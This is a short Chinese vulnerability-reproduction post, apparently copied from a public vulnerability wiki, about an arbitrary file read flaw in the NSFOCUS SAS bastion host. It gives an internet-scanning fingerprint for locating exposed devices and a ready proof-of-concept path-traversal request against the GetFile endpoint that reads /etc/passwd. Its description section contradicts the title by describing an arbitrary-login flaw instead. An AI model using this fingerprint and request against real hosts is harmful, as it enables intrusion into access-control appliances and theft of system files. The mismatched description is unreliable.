---
title: "绿盟 SAS堡垒机 GetFile 任意文件读取漏洞"
date: 2026-10-18 09:16:35
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "绿盟"
tags:
  - "绿盟"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录

## 漏洞影响

绿盟 SAS堡垒机

## 网络测绘

```
body="'/needUsbkey.php?username='"
```

## 漏洞复现

登陆页面

![image-20230828162656143](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828162656143.png)

漏洞存在于文件 GetFileController.php 文件中

![image-20230828162808415](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828162808415.png)

验证POC

```
/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
```

![image-20230828162825768](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828162825768.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BB%BF%E7%9B%9F-SAS%E5%A0%A1%E5%9E%92%E6%9C%BA-GetFile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
